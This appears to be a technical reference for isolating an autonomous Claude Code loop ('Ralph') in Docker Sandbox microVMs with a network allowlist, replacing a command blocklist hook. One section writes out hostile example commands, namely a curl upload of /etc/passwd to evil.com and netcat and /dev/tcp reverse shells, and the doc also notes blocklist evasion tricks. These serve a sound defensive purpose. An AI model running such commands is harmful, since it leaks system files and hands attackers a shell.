# Docker Sandbox Isolation — Ralph Loop Reference

> Replace the PreToolUse command blocklist with OS-level microVM isolation via Docker Sandboxes. This provides stronger safety guarantees for `--dangerously-skip-permissions` and removes per-tool-call hook overhead.

---

## Why sandbox instead of a blocklist

|                        | PreToolUse Blocklist                                                            | Docker Sandbox                                            |
| ---------------------- | ------------------------------------------------------------------------------- | --------------------------------------------------------- |
| Security model         | Regex pattern matching (bypassable via variable expansion, subshells, encoding) | Hypervisor-level VM boundary (not bypassable from inside) |
| Network safety         | Must enumerate exfiltration patterns                                            | Built-in proxy with domain allowlisting                   |
| Evasion resistance     | Weak — attacker can split commands, use `$'\x72\x6d'`, aliases                  | Strong — even `rm -rf /` only destroys the sandbox        |
| Per-iteration overhead | ~50-100ms (hook runs on every Bash tool call)                                   | ~1-2s (sandbox reconnect, amortized across tool calls)    |
| Maintenance burden     | Must keep pattern list updated as new attack vectors emerge                     | Zero — isolation is structural                            |

The blocklist (`pretooluse-hook-reference.md`) remains useful as documentation and as a fallback for environments without Docker Desktop.

---

## Prerequisites

- **Docker Desktop 4.58+** with Sandboxes enabled (Settings > Features in development > Enable Docker Sandboxes)
- macOS (primary, uses `virtualization.framework`), Windows (experimental, Hyper-V), or Linux (legacy container mode via Docker Desktop 4.57+)
- Claude Code CLI installed on host (for initial auth)
- Feature status: **Beta** — Claude Code is the most tested agent implementation

---

## Architecture

```
┌─ Host (macOS) ──────────────────────────────────────────────┐
│                                                             │
│  ralph.sh                                                   │
│    │                                                        │
│    ├── iteration 1: docker sandbox run ... -- -p "$PROMPT"  │
│    ├── iteration 2: docker sandbox run ... -- -p "$PROMPT"  │
│    └── ...                                                  │
│                                                             │
│  ~/.dclaude_state/        (shared auth/settings)           │
│    ├── .claude/                                             │
│    │   ├── settings.json                                    │
│    │   └── .credentials.json                                │
│    └── .claude.json                                         │
│                                                             │
│  target-project/           (synced bidirectionally)         │
│    ├── ralph/                                               │
│    │   ├── prd.json                                         │
│    │   ├── progress.txt                                     │
│    │   └── prompt.md                                        │
│    └── .ralph-active                                        │
│                                                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─ Docker Sandbox microVM ──────────────────────────────┐  │
│  │                                                       │  │
│  │  User: agent (non-root, has sudo)                     │  │
│  │  Claude Code + --dangerously-skip-permissions         │  │
│  │                                                       │  │
│  │  Workspace: /Users/.../target-project (same abs path) │  │
│  │  Auth: symlinked from mounted ~/.dclaude_state       │  │
│  │                                                       │  │
│  │  Hooks active inside VM:                              │  │
│  │    ├── context_monitor.py  (PostToolUse)              │  │
│  │    └── stop_loop_reminder.py (Stop)                   │  │
│  │                                                       │  │
│  │  Network: filtered through host proxy                 │  │
│  │    host.docker.internal:3128                          │  │
│  │    ├── ALLOW: *.anthropic.com, github.com, ...        │  │
│  │    └── BLOCK: everything else                         │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

Key properties:
- Each `docker sandbox run` in the same workspace **reconnects** to the existing sandbox (1:1 workspace-to-sandbox mapping)
- Each `claude -p` invocation is still a **fresh context window** (separate process inside the persistent sandbox)
- File sync is **bidirectional** at the same absolute path — `prd.json` and `progress.txt` written in iteration N are available in iteration N+1
- The sandbox's own Docker daemon is isolated — no access to host containers

---

## Setup

### 1. Create shared auth state directory

```bash
mkdir -p "$HOME/.dclaude_state/.claude"
touch "$HOME/.dclaude_state/.claude.json"
```

### 2. Build custom sandbox template

Create `~/.dclaude_template/entrypoint.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail

# Locate the host user's shared state dir (mounted at same abs path)
STATE_DIR_GLOB="/Users/*/.dclaude_state"
STATE_DIR=""
for d in $STATE_DIR_GLOB; do
  [ -d "$d" ] && STATE_DIR="$d" && break
done

if [ -n "$STATE_DIR" ]; then
  mkdir -p "$STATE_DIR/.claude"
  [ -f "$STATE_DIR/.claude.json" ] || touch "$STATE_DIR/.claude.json"

  # Symlink into sandbox user's home
  rm -rf /home/agent/.claude /home/agent/.claude.json 2>/dev/null || true
  ln -s "$STATE_DIR/.claude" /home/agent/.claude
  ln -s "$STATE_DIR/.claude.json" /home/agent/.claude.json
  chown -h agent:agent /home/agent/.claude /home/agent/.claude.json 2>/dev/null || true
fi

exec claude "$@"
```

Create `~/.dclaude_template/Dockerfile`:

```dockerfile
FROM docker/sandbox-templates:claude-code

COPY entrypoint.sh /usr/local/bin/dclaude-entrypoint
RUN chmod +x /usr/local/bin/dclaude-entrypoint

ENTRYPOINT ["/usr/local/bin/dclaude-entrypoint"]
```

Build:

```bash
cd ~/.dclaude_template && docker build -t dclaude:latest .
```

### 3. Initial auth (one-time)

Run interactively once to complete OAuth login:

```bash
docker sandbox run -t dclaude:latest claude "$HOME/.dclaude_state" .
```

Log in when prompted. The credentials persist in `~/.dclaude_state/.claude/` and are reused by all future sandboxes.

---

## Integration with ralph.sh

### Invocation change

The loop runner replaces direct `claude` calls with sandbox-wrapped calls:

```bash
# Before (no sandbox)
claude -p "$PROMPT" --dangerously-skip-permissions

# After (sandbox mode)
docker sandbox run \
  -t dclaude:latest \
  --name "ralph-${SAFE_PROJECT_NAME}" \
  claude "$PROJECT_DIR" "$HOME/.dclaude_state" \
  -- -p "$PROMPT"
```

Notes:
- `--name` creates a stable sandbox per project (reused across iterations)
- The workspace (`$PROJECT_DIR`) and auth state (`$HOME/.dclaude_state`) are both mounted
- `-- -p "$PROMPT"` passes args through to Claude inside the sandbox
- `--dangerously-skip-permissions` is already applied by the sandbox template

### Mode detection

`ralph.sh` should auto-detect Docker availability:

```bash
use_sandbox() {
  command -v docker >/dev/null 2>&1 \
    && docker sandbox ls >/dev/null 2>&1
}
```

CLI flags:
```
ralph.sh [OPTIONS]
  --sandbox        Force Docker Sandbox mode (error if unavailable)
  --no-sandbox     Force direct mode with PreToolUse hook blocklist
                   (default: auto-detect, prefer sandbox)
```

### Hooks inside the sandbox

The remaining hooks run inside the sandbox VM as the `agent` user:

| Hook                                       | Runs inside sandbox? | Notes                                                     |
| ------------------------------------------ | -------------------- | --------------------------------------------------------- |
| `context_monitor.py` (PostToolUse)         | Yes                  | Transcript file is local to the VM; works normally        |
| `stop_loop_reminder.py` (Stop)             | Yes                  | `git status` operates on synced workspace; works normally |
| `block_dangerous_commands.py` (PreToolUse) | **Removed**          | Sandbox makes it unnecessary                              |

The hooks are loaded from the plugin's `hooks.json` which is part of the project configuration synced into the sandbox.

---

## Network policy hardening

Default sandbox network: allows all HTTP/HTTPS outbound through the proxy. Block everything except what Claude needs:

```bash
SANDBOX_NAME="ralph-myproject"

docker sandbox network proxy "$SANDBOX_NAME" \
  --policy deny \
  --allow-host "*.anthropic.com" \
  --allow-host "platform.claude.com:443" \
  --allow-host "github.com" \
  --allow-host "*.githubusercontent.com" \
  --allow-host "api.github.com" \
  --allow-host "registry.npmjs.org" \
  --allow-host "pypi.org" \
  --allow-host "files.pythonhosted.org"
```

Add more hosts as needed for your project (private registries, CDNs, etc.). Non-HTTP protocols (raw TCP, UDP) are blocked by default — this neutralizes reverse shells, netcat, socat, etc. without any regex patterns.

Policy persists at `~/.docker/sandboxes/vm/<name>/proxy-config.json`.

### What the network policy blocks for free

Everything in categories 4, 5, and parts of 9 from `pretooluse-hook-reference.md`:
- `curl -d @/etc/passwd http://evil.com` — blocked unless `evil.com` is in allowlist
- `nc -e /bin/bash attacker.com 4444` — blocked (non-HTTP protocol)
- `bash -i >& /dev/tcp/10.0.0.1/8080` — blocked (non-HTTP)
- `scp`, `rsync`, `sftp`, `ftp` — blocked (non-HTTP)
- `ssh -R` tunneling — blocked (non-HTTP)
- `ngrok`, `cloudflared tunnel` — blocked unless explicitly allowed
- `python3 -m http.server` — runs inside VM, not reachable from outside

---

## The dclaude wrapper (optional convenience)

For interactive use outside of `ralph.sh`:

```bash
dclaude() {
  local workspace="${1:-.}"
  workspace="$(cd "$workspace" && pwd)"
  shift 2>/dev/null || true

  # Separate wrapper args from claude args
  [[ "${1:-}" == "--" ]] && shift

  local safe_name
  safe_name="$(echo "$workspace" | sed 's#[^A-Za-z0-9._-]#_#g')"

  docker sandbox run \
    --name "dclaude-${safe_name}" \
    -t dclaude:latest \
    claude "$workspace" "$HOME/.dclaude_state" \
    -- "$@"
}
```

Usage:
```bash
dclaude                          # TUI in current directory
dclaude /path/to/repo            # TUI in specific directory
dclaude . -- --resume            # Resume last session
dclaude . -- -p "prompt text"    # Headless/pipe mode
```

---

## Known caveats

### Auth conflicts with Max/Pro plans

The sandbox's host proxy injects credentials via `apiKeyHelper`. This can conflict with OAuth tokens from interactive login. Symptoms: 401 errors, repeated login prompts.

**Workaround**: Set `ANTHROPIC_API_KEY` as an environment variable instead of using interactive auth:
```bash
docker sandbox run -e ANTHROPIC_API_KEY="sk-ant-..." -t dclaude:latest claude .
```

Or set it in the entrypoint from a mounted secrets file. The symlink-based auth sharing approach described above works for interactive login but should be tested with your specific plan.

### File sync latency

Docker Sandboxes use bidirectional file sync, not direct volume mounts. There can be sub-second delays between a write inside the sandbox and visibility on the host (and vice versa).

**Impact on Ralph Loop**: Between iterations, `ralph.sh` reads `prd.json` on the host to check completion. If the sandbox just wrote it, there could be a brief race. Mitigation: add a short sleep (1-2s) between iterations, or perform the completion check inside the sandbox.

### One sandbox per workspace

Docker enforces a 1:1 mapping between workspace path and sandbox. Running `ralph.sh` from the same project directory always reconnects to the same sandbox. This is desirable — the sandbox persists tools, caches, and state.

**Conflict scenario**: If you run `dclaude` interactively AND `ralph.sh` simultaneously on the same project, they'll contend for the same sandbox. Avoid this.

### Beta stability

Docker Sandboxes are a beta feature. The API surface (`docker sandbox run`, network policies, template format) may change between Docker Desktop releases. Pin your Docker Desktop version for production use.

### Docker Desktop licensing

Docker Desktop requires a paid subscription for organizations with >250 employees or >$10M revenue. This affects portability of the Ralph plugin to enterprise users who may not have Docker Desktop.

### Intel Mac issues

At least one reported issue with Docker Desktop 4.58.0 on Intel Macs. Apple Silicon is the primary development target.

---

## Fallback: PreToolUse hook mode

When Docker Sandboxes are unavailable, `ralph.sh --no-sandbox` falls back to running `claude` directly with `--dangerously-skip-permissions`. In this mode, safety depends on a PreToolUse hook (`block_dangerous_commands.py`) that pattern-matches commands against a blocklist. See `pretooluse-hook-reference.md` for the full pattern reference, implementation architecture, and evasion awareness notes.

The plugin tree for direct (non-sandbox) mode:
```
claude-code/plugins/ralph/
├── hooks/
│   ├── hooks.json                      # Wires all hooks
│   └── scripts/
│       ├── block_dangerous_commands.py  # Active in direct mode only
│       ├── context_monitor.py           # Always active
│       └── stop_loop_reminder.py        # Always active (ralph-only)
```

In sandbox mode, `block_dangerous_commands.py` is not wired — the sandbox provides stronger isolation. The `hooks.json` used in sandbox mode omits the PreToolUse entry.

---

## Summary of plan changes

| Plan section                               | Change                                                                         |
| ------------------------------------------ | ------------------------------------------------------------------------------ |
| Section 3 (`ralph.sh`)                     | Add `--sandbox`/`--no-sandbox` flags; default to sandbox when Docker available |
| Section 4a (`block_dangerous_commands.py`) | Keep as fallback, not primary safety mechanism                                 |
| Section 4 (`hooks.json`)                   | Keep PreToolUse entry for defense-in-depth / fallback                          |
| Prerequisites                              | Add Docker Desktop 4.58+ as recommended (not required)                         |
| New section                                | Docker Sandbox template + wrapper setup (`dclaude`)                            |
| New section                                | Network policy configuration                                                   |
| `ralph-init.sh`                            | Optionally configure network policy for the sandbox                            |
